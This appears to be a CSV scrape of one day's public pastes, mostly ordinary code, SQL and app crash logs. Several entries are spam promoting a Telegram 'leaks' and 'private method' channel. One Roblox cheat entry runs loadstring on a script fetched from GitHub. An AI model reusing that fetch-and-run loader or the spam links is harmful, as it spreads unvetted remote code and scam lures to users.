id,title,username,language,date,content
s6QnjA8S,profile_details.css,horozov86,CSS,Wednesday 14th of May 2025 07:00:44 AM CDT,"html, body {
    height: 100%;
    margin: 0;
    padding: 0;
    font-family: sans-serif;
    background: linear-gradient(#141e30, #243b55);
    color: #fff;
}

/* Основен контейнер */
.info-section {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 400px;
    padding: 40px;
    transform: translate(-50%, -50%);
    background: rgba(0, 0, 0, 0.5);
    box-sizing: border-box;
    box-shadow: 0 15px 25px rgba(0, 0, 0, 0.6);
    border-radius: 10px;
}

/* Заглавие */
.info-section h1 {
    margin-bottom: 30px;
    text-align: center;
    font-size: 28px;
    color: #f4ec03;
}

/* Снимка на профила */
.profile-photo {
    text-align: center;
    margin-bottom: 20px;
}

.profile-photo img {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    border: 3px solid #f4ec03;
    object-fit: cover;
}

/* Описание */
.description {
    font-size: 16px;
    margin-bottom: 10px;
    padding-left: 5px;
    border-left: 3px solid #f4ec03;
}

/* Бутони */
.buttons {
    margin-top: 30px;
    text-align: center;
    display: flex;
    justify-content: space-between;
}

.edit-button,
.delete-button {
    padding: 10px 20px;
    color: #f4ec03;
    font-size: 14px;
    text-decoration: none;
    text-transform: uppercase;
    border: 1px solid #f4ec03;
    border-radius: 5px;
    background: transparent;
    transition: all 0.3s ease;
    width: 45%;
    text-align: center;
}

.edit-button:hover,
.delete-button:hover {
    background-color: #f4ec03;
    color: #141e30;
    box-shadow: 0 0 10px #f4ec03;
}"
afrDJRDn,profile_details.html,horozov86,HTML 5,Wednesday 14th of May 2025 06:59:08 AM CDT,"
<!-- {% extends 'base.html' %} -->
<!-- {% load static %} -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Profile Details</title>
    <!-- <link rel=""stylesheet"" href=""{% static 'css/profile_details.css' %}""> -->
    <link rel=""stylesheet"" href=""css/profile_details.css""> <!-- Локален стил -->
</head>
<body>
    <div class=""info-section"">
        <h1>Profile Details</h1>

        <div class=""profile-photo"">
            <!-- {% if profile.profile_photo %} -->
            <!-- <img class=""car-img"" src=""{{ profile.profile_photo.url }}"" alt=""Profile Image"" /> -->
            <!-- {% else %} -->
            <img class=""car-img"" src=""images/default_profile_image.png"" alt=""Default Profile Image"" />
            <!-- {% endif %} -->
        </div>

        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">First name: Georgi</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Last name: Horozov</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Age: 39</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Date of birth: 14-03-1986</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Country: Bulgaria</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">City: Bulgaria</p>

        <!-- <p class=""description"">Address: {{ profile.address }}</p> -->
        <p class=""description"">Address: 123 Main Street, Sofia</p>

        <!-- Action Buttons -->
        <div class=""buttons"">
            <!-- <a href=""{% url 'profile_update' pk=object.pk %}"" class=""edit-button"">Edit</a> -->
            <!-- <a href=""{% url 'profile_delete' pk=object.pk %}"" class=""delete-button"">Delete</a> -->
            <a href=""#"" class=""edit-button"">Edit</a>
            <a href=""#"" class=""delete-button"">Delete</a>
        </div>
    </div>

    <!-- Optional Form for Additional Actions -->
    <!-- Optional Form for Additional Actions -->
<!--     <form method=""post"" enctype=""multipart/form-data"">
        {% csrf_token %}
        {{ form.as_p }}
    </form>
    {% endblock %} -->
</body>
</html>"
19JL1NAG,❤️private mehtod TG,Haigorilla,JavaScript,Wednesday 14th of May 2025 06:57:04 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

IfJh0kxATA
"
uZBq5qV5,❤️private mehtod C4,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:47:47 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

WSSS24lg2s
"
1Hjz3Cmn,telegram leaks❤️ XU,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:41:04 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

FPvUIVCnmo
"
yAU5u4i1,❤️private mehtod XA,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:34:20 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

0KuwreoiyN
"
c7gJSbn5,telegram leaks❤️ 4G,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:27:37 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

vRSZFiGIsB
"
JBvVpkva,Download,Shiko5303,Lua,Wednesday 14th of May 2025 06:24:42 AM CDT,"    local choice = gg.choice({""Check current version Block Strike"", ""Back""}, nil, ""Chose:"")

    if choice == 1 then
        gg.sleep(1900)

        local versions = {""4391""}
        local links = {
            ""https://pastebin.com/raw/xyz123""
        }

        local versionChoice = gg.choice(versions, nil, ""Found: 1"")

        if versionChoice then
            local versionName = versions[versionChoice]
            local selectedLink = links[versionChoice]
            if gg.copyText then
                gg.copyText(selectedLink)
                gg.toast(""Link copied to clipboard."")
            end
            local filePath = ""/sdcard/Documents/Download"" .. versionName .. "".txt""
            local file = io.open(filePath, ""w"")
            if file then
                file:write(selectedLink)
                file:close()
            else
                gg.alert(""Failed to save file."")
            end
        else
            gg.toast(""No version selected."")
        end
    else
        gg.toast(""Back selected."")
    end"
0gxsfAbD,❤️private mehtod WE,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:20:55 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

CwdY6tH1Uo
"
mL1E1WvT,Untitled,dllbridge,C,Wednesday 14th of May 2025 06:18:21 AM CDT,"
#include   <iostream>
#include   <stdlib.h>
#include    <iomanip>
#include     <time.h>
using namespace  std;



const int B = 20, A = 20;
int foo(int* p);

/////////////////////////////////////////////////
int main()
{
    
	srand(time(0));
	int  array[B];
	int    mas[B];
	
	for(int i = 0; i < B; i++)
    {

		  mas[i] = rand() % 100 - 10;
		array[i] = rand() % 100 - 10;
		
		cout << "" "" << setw(3) << array[i] << ""   "" 
                    << setw(3) <<   mas[i] << endl;		
    }
    
	int v = foo(array);
	int g = foo(  mas);
	
	cout << "" array[i] ="" << v << endl;
	cout << ""   mas[i] ="" << g << endl;

	if(v < g)
	{
	//	cout << ""  foo(mas) = "" << foo(mas) << endl;
	//	if (g < foo(array))
	//	{
	//		cout << ""  foo(array)  =  "" << foo(array) << endl;
	//	}
		      cout << ""Win array"" << endl;
	}
	if(g < v) cout << ""Win   mas"" << endl;

	
/*           	cout << endl;
	for (int j = 0; j < B; j++) {

		mas[j] = rand() % 10;
		      
		cout << "" "" << mas[j];
	}*/
}


int foo(int* p)
{
	int i = 0;
	for (int i = 0; i < B; i++)
	{
		if (p[i] < 0)
		{
			return i;
		}
	
	}
	return -1;
 }
 
 
 
 "
4K1gQe1M,Computercraft Logging API,Pastebin_Paster,Lua,Wednesday 14th of May 2025 06:14:26 AM CDT,"--Variables
logFile = ""logFile.lua""
logShowProgram = false
logShowClearedMessage = true

logTimestampFormat = ""[%s]""
logDateTimeFormat = ""%F %R""
logProgramFormat = ""[%s]""
logClearedMessage = ""--LOG CLEARED--""
currentRunningProgram = nil

--Functions
function filePath(path) logFile = tostring(path) end
function setShowProgram(var) logShowProgram = var end
function setShowClearedMessage(setVar) logShowClearedMessage = setVar end
function setCurrentProgram(setvar) currentRunningProgram = setvar end
function setClearedMessage(message) logClearedMessage = tostring(message) end
function setProgramFormat(pFormat) logProgramFormat = pFormat end
function setTimestampFormat(tFormat) logTimestampFormat = tFormat end
function setDateTimeFormat(dFormat) logDateTimeFormat = dFormat end

function reset() 
    logFile = ""logFile.lua""
    logShowProgram = false
    logShowClearedMessage = true

    logTimestampFormat = ""[%s]""
    logDateTimeFormat = ""%F %R""
    logProgramFormat = ""[%s]""
    logClearedMessage = ""--LOG CLEARED--""
    currentRunningProgram = nil
end

function output(statement)
    timeString = string.format(logTimestampFormat, os.date(logDateTimeFormat))
    programString = string.format(logProgramFormat, currentRunningProgram)

    file = fs.open(logFile, ""a"")
    if logShowProgram == true then
        file.write(timeString..programString.."": ""..tostring(statement)..""\n"")
    else
        file.write(timeString.."": ""..tostring(statement)..""\n"")
    end
    file.close()
end

function clear()
    timeString = string.format(logTimestampFormat, os.date(logDateTimeFormat))
    programString = string.format(logProgramFormat, currentRunningProgram)

    file = fs.open(logFile, ""w"")
    if logShowProgram == true and logShowClearedMessage == true then
        file.write(timeString..programString.."": ""..tostring(logClearedMessage)..""\n"")
    elseif logShowClearedMessage == true then
        file.write(timeString.."": ""..tostring(logClearedMessage)..""\n"")
    end
    file.close()
end"
H16pDf60,❤️private mehtod C4,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:14:12 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

iH7h6Ihhw9
"
B8KZcXtf,telegram leaks EQ,sagorpm,JavaScript,Wednesday 14th of May 2025 06:12:27 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

a1iXiRBvsJ
"
hrknmuWd,private mehtod NH,Trxpkingj,JavaScript,Wednesday 14th of May 2025 06:10:25 AM CDT," 
check it out at t.me/LucasL3AK/15  

iFvVNpH77C
"
BHG1QfGh,dataNone,TestGuy1,JSON,Wednesday 14th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '22593c7cb4b8f16fd2082b5a5bc121935553edb6d79c1f86e1a8ca57eaabe12c595b1852e0ec234bb897d2f328c1c304ce90d8621b7b12b73c8b2fc7eac39dd1e2640c018e00748f105dadebb18c3be4f8e4d5e2ac62964d9679505785f56225e5ef723f8c2b5cd261b79e752304eda48a77d01d214079eab215795a71a0cb2b',
  otherdata: [
    '4222ba4eed021eb3ee923e0a56d82889',
    '5662c4fecfad82df142d03d1b3b29756',
    'a4bdd3c63dbf4a6ea2e6c340e15dd409',
    '4035c0cfe57e27b6f312d2c4f4fe51f7',
    '7f8a8b1cc21ecf053990d6afe4d9f0c2',
    '1fbe1cd468d8c92613fb4796dd9dbc45',
    '2592d825b579128450a79bedbfb7e468',
    'f8404ce887b8d72cf61fc1bbaeda8289'
  ]
}"
J6xvhn4K,kamera.ino,vitareinforce,Arduino,Wednesday 14th of May 2025 05:13:13 AM CDT,"#include ""esp_camera.h""
#include <WiFi.h>

// Pilih model kamera yang sesuai
#define CAMERA_MODEL_AI_THINKER // ESP32-CAM AI-THINKER dengan OV2640
#include ""camera_pins.h""

// WiFi credentials
const char* ssid = ""Megabot"";
const char* password = ""1234567890"";

void startCameraServer();

void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  Serial.println();

  // Konfigurasi kamera
  camera_config_t config;
  config.ledc_channel = LEDC_CHANNEL_0;
  config.ledc_timer = LEDC_TIMER_0;
  config.pin_d0 = Y2_GPIO_NUM;
  config.pin_d1 = Y3_GPIO_NUM;
  config.pin_d2 = Y4_GPIO_NUM;
  config.pin_d3 = Y5_GPIO_NUM;
  config.pin_d4 = Y6_GPIO_NUM;
  config.pin_d5 = Y7_GPIO_NUM;
  config.pin_d6 = Y8_GPIO_NUM;
  config.pin_d7 = Y9_GPIO_NUM;
  config.pin_xclk = XCLK_GPIO_NUM;
  config.pin_pclk = PCLK_GPIO_NUM;
  config.pin_vsync = VSYNC_GPIO_NUM;
  config.pin_href = HREF_GPIO_NUM;
  config.pin_sccb_sda = SIOD_GPIO_NUM;
  config.pin_sccb_scl = SIOC_GPIO_NUM;
  config.pin_pwdn = PWDN_GPIO_NUM;
  config.pin_reset = RESET_GPIO_NUM;
  config.xclk_freq_hz = 20000000;
  // config.pixel_format = PIXFORMAT_JPEG; 
  config.pixel_format = PIXFORMAT_RGB565; 
  config.frame_size = FRAMESIZE_QVGA; // Resolusi lebih rendah untuk stabilitas awal
  config.jpeg_quality = 10; // 10 = kualitas medium, 12 = lebih tinggi
  config.fb_count = 1;

  // Inisialisasi kamera
  esp_err_t err = esp_camera_init(&config);
  if (err != ESP_OK) {
    Serial.printf(""❌ Kamera gagal diinisialisasi, error 0x%x\n"", err);
    return;
  }

  // Konfigurasi sensor kamera
  sensor_t *s = esp_camera_sensor_get();
  if (s->id.PID == OV3660_PID) {
    s->set_vflip(s, 1);  // Flip vertikal
    s->set_brightness(s, 1); // Tambah kecerahan
    s->set_saturation(s, -2); // Kurangi saturasi warna
  }

  // Setup WiFi
  WiFi.begin(ssid, password);
  WiFi.setSleep(false);
  Serial.print(""Menghubungkan ke WiFi"");
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  Serial.println(""\n✅ WiFi Terhubung!"");
  
  // Jalankan server kamera
  startCameraServer();
  
  Serial.print(""📷 Kamera Siap! Buka: http://"");
  Serial.print(WiFi.localIP());
  Serial.println(""/"");
}

void loop() {
  delay(10000); // Loop tidak perlu melakukan apa-apa, server berjalan sendiri
}
"
Ry8XXSEL,Untitled,kirzecy670,MySQL,Wednesday 14th of May 2025 05:01:32 AM CDT,"with 
event_counts AS (
    SELECT 
        ft.uid,
        ft.dt,
        CASE
            WHEN (deviceType = 2 AND appVersion % 2 = 0) THEN 'iOS_Parent'
            WHEN (deviceType = 1 AND appVersion % 2 = 1) THEN 'Android_Parent'
            WHEN (deviceType = 2 AND appVersion % 2 = 1) THEN 'iOS_Child'
            WHEN (deviceType = 1 AND appVersion % 2 = 0) THEN 'Android_Child'
            ELSE 'Unknown'
        END AS platform,
        had_any_payment,
        ft.dt >= pp.full_reg_datetime + interval '30' day as flg_30day_old_user,
        region,
        MAX(ft.action in ('open', 'open_parent_activity', 'open_parent_screen')) AS open,
        COUNT(ft.uid) FILTER (WHERE ft.action in ('open', 'open_parent_activity', 'open_parent_screen')) AS open_count,
        MAX(ft.action = 'feed_opened_full') AS is_feed_opened_full,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'feed_opened_full') AS feed_opened_full_count,
        MAX(ft.action = 'open_function_records') AS is_open_function_records,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_records') AS  open_records_count,
        MAX(ft.action = 'open_function_noise') AS is_open_function_noise,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_noise') AS  open_noise_count,
        MAX(ft.action = 'open_function_zones') AS is_open_function_zones,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_zones') AS  open_zones_count,
        MAX(ft.action = 'open_function_appstat') AS is_open_function_appstat,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_appstat') AS  open_appstat_count,
        MAX(ft.action IN (
        'open_function_records',
        'open_function_noise',
        'open_function_zones',
        'open_function_appstat'
        )) AS is_any_feature_used
    FROM 
        stat.funnelTrack ft join analytics.parent_properties pp using uid
    WHERE ft.dt >= '2025-04-01'
      AND ft.action IN (
          'open', 'open_parent_activity', 'open_parent_screen',
          'feed_opened_full',
          'open_function_records', 'open_function_noise', 'open_function_zones', 
          'open_function_appstat'
      )
    GROUP BY 1, 2, 3, 4, 5, 6
)

SELECT
dt,
platform,
had_any_payment,
flg_30day_old_user,
region,
    uniq(uid) as total_users,  -- Debug: total users in event_counts
    uniqIf(uid, open) active_users,
    uniqIf(uid, is_any_feature_used) users_with_any_feature,
    uniqIf(uid, is_feed_opened_full) as users_feed_opened, 
    uniqIf(uid, is_open_function_records) as users_records,
    uniqIf(uid, is_open_function_appstat) as users_appstat,
    uniqIf(uid, is_open_function_zones) as users_zones,
    round(users_with_any_feature/active_users, 4) as use_any_feature
FROM event_counts
group by 1, 2, 3, 4, 5
ORDER BY dt"
PYrSeb82,Leetcode problem 4 (Hard) 6ms response 100%accepted,BojidarDosev,Java,Wednesday 14th of May 2025 04:44:25 AM CDT,"import java.util.*;

public class Main {
    public static double findMedianSortedArrays(int[] nums1, int[] nums2) {

        List<Integer> list = new ArrayList<>();
        for (int n : nums1) list.add(n);
        for (int n : nums2) list.add(n);
        Collections.sort(list);

        if(list.size()%2==0){
            return (double)(list.get(list.size()/2-1) + (double)list.get(list.size()/2)) /2;
        }
        else{
            return (double)list.get(list.size()/2);
        }

    }

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String[] ar1 = sc.nextLine().split("","");
        String[] ar2 = sc.nextLine().split("","");
        int[] nums1 = new int[ar1.length];
        int[] nums2 = new int[ar2.length];
        for (int i = 0; i < nums1.length; i++) {
            nums1[i] = Integer.parseInt(ar1[i]);
        }
        for (int i = 0; i < nums2.length; i++) {
            nums2[i] = Integer.parseInt(ar2[i]);
        }

        System.out.println(findMedianSortedArrays(nums1, nums2));
    }
}"
pKPbDfNG,2025-05-14T12:31:09.690,powerampache,PHP,Wednesday 14th of May 2025 04:31:10 AM CDT,"1.00-68 (68) - DB: 82
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:161)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:929)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
XZris0Sv,Dungeon Heroes⚔️,new2479,Lua,Wednesday 14th of May 2025 03:16:26 AM CDT,"--https://www.youtube.com/@WinPo1R              pls sub 
--discord :      https://discord.gg/mdnJJYbjCh
--key :       Deepworksuper

loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Dungeon_Heroes.lua"", true))()"
nL8SRZB6,Asli theme: vertically center overlay menu items,artemsemkin,CSS,Wednesday 14th of May 2025 03:13:08 AM CDT,".menu-overlay {
  display: flex;
  flex-direction: column;
  justify-content: center;
}"
PYLjEY6x,2025-05-14T09:38:36.916993,powerampache,PHP,Wednesday 14th of May 2025 02:38:37 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms\"" }"",""stackTrace"":[]}"
SFE0uURS,2025-05-14T09:38:15.986053,powerampache,PHP,Wednesday 14th of May 2025 02:38:16 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms\"" }"",""stackTrace"":[]}"
1wpp2A2S,2025-05-14T09:37:40.291041,powerampache,PHP,Wednesday 14th of May 2025 02:37:40 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms\"" }"",""stackTrace"":[]}"
1SeSL0Fq,2025-05-14T09:34:49.952994,powerampache,PHP,Wednesday 14th of May 2025 02:34:50 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms\"" }"",""stackTrace"":[]}"
r39utqgJ,2025-05-14T09:34:45.127011,powerampache,PHP,Wednesday 14th of May 2025 02:34:46 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms\"" }"",""stackTrace"":[]}"
Bzh31QZr,GULIKHUB,Trollwor,Lua,Wednesday 14th of May 2025 02:17:18 AM CDT,"-- GulikHub Full GUI - Upgraded Template with Classic Features
-- Rebuilt by your overconfident AI rebel genius

local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild(""PlayerGui"")

-- ScreenGui setup
local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""GulikHubUI""
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = PlayerGui

-- Main draggable frame
local mainFrame = Instance.new(""Frame"")
mainFrame.Name = ""MainFrame""
mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Title label
local titleLabel = Instance.new(""TextLabel"")
titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.Text = ""GulikHub UI""
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.Parent = mainFrame

-- Status Label (for prints/warns)
local statusLabel = Instance.new(""TextLabel"")
statusLabel.Size = UDim2.new(1, 0, 0.05, 0)
statusLabel.Position = UDim2.new(0, 0, 0.9, 0)
statusLabel.Text = ""Status: Ready""
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 0)
statusLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

-- FPS label
local fpsLabel = Instance.new(""TextLabel"")
fpsLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
fpsLabel.Position = UDim2.new(0.7, 0, 0.95, 0)
fpsLabel.Text = ""FPS: 0""
fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
fpsLabel.BackgroundTransparency = 1
fpsLabel.Font = Enum.Font.Code
fpsLabel.TextSize = 16
fpsLabel.Parent = mainFrame

-- RightShift toggle
local guiVisible = true
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.RightShift then
        guiVisible = not guiVisible
        screenGui.Enabled = guiVisible
        statusLabel.Text = ""Status: UI "" .. (guiVisible and ""Shown"" or ""Hidden"")
    end
end)

-- FPS counter logic
local lastTime = tick()
local frames = 0
RunService.RenderStepped:Connect(function()
    frames += 1
    if tick() - lastTime >= 1 then
        fpsLabel.Text = ""FPS: "" .. frames
        frames = 0
        lastTime = tick()
    end
end)

-- Language switcher basic (EN, RU, UA)
local currentLang = ""EN""
local function switchLanguage(lang)
    currentLang = lang
    if lang == ""EN"" then
        titleLabel.Text = ""GulikHub UI""
        statusLabel.Text = ""Status: Ready""
    elseif lang == ""RU"" then
        titleLabel.Text = ""ГуликХаб Интерфейс""
        statusLabel.Text = ""Статус: Готово""
    elseif lang == ""UA"" then
        titleLabel.Text = ""ГулікХаб Інтерфейс""
        statusLabel.Text = ""Статус: Готово""
    end
end

-- Language buttons
local languages = {""EN"", ""RU"", ""UA""}
for i, lang in ipairs(languages) do
    local button = Instance.new(""TextButton"")
    button.Size = UDim2.new(0.3, 0, 0.07, 0)
    button.Position = UDim2.new(0.05 + (i - 1) * 0.32, 0, 0.12, 0)
    button.Text = lang
    button.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.Gotham
    button.TextSize = 16
    button.Parent = mainFrame
    button.MouseButton1Click:Connect(function()
        switchLanguage(lang)
    end)
end

-- Password checker (""opensesame"")
local passwordBox = Instance.new(""TextBox"")
passwordBox.Size = UDim2.new(0.6, 0, 0.08, 0)
passwordBox.Position = UDim2.new(0.2, 0, 0.21, 0)
passwordBox.PlaceholderText = ""Enter Password""
passwordBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
passwordBox.TextColor3 = Color3.new(1, 1, 1)
passwordBox.Font = Enum.Font.Code
passwordBox.TextSize = 18
passwordBox.Parent = mainFrame

passwordBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        if passwordBox.Text == ""opensesame"" then
            statusLabel.Text = ""Access Granted""
        else
            statusLabel.Text = ""Access Denied""
        end
    end
end)

-- Add more features like: Script Hub, Executor, Themes, Dock System
-- Modular, mobile-friendly, and rebellious. Expand it and rule!
"
PPHucRx4,stress test rmq,vitareinforce,Python,Wednesday 14th of May 2025 01:49:21 AM CDT,"import pika
import sys
import time
import keyboard  # Import the keyboard library

def connect_and_publish(client_id, user, password, host, queue_name):
    """"""Connect to RabbitMQ and publish messages with client ID set in connection properties.""""""
    credentials = pika.PlainCredentials(user, password)
    parameters = pika.ConnectionParameters(
        host=host,
        credentials=credentials,
        client_properties={
            'connection_name': client_id
        }
    )

    connection = None
    for i in range(5):
        try:
            connection = pika.BlockingConnection(parameters)
            print(f""Connected to RabbitMQ with client ID '{client_id}'"")
            break
        except pika.exceptions.AMQPConnectionError:
            print(f""Connection failed, retrying in 5 seconds... ({i+1}/5)"")
            time.sleep(5)
    else:
        print(""Failed to connect to RabbitMQ after 5 attempts."")
        sys.exit(1)

    channel = connection.channel()

    # Declare queue to publish to
    channel.queue_declare(queue=queue_name, durable=False)

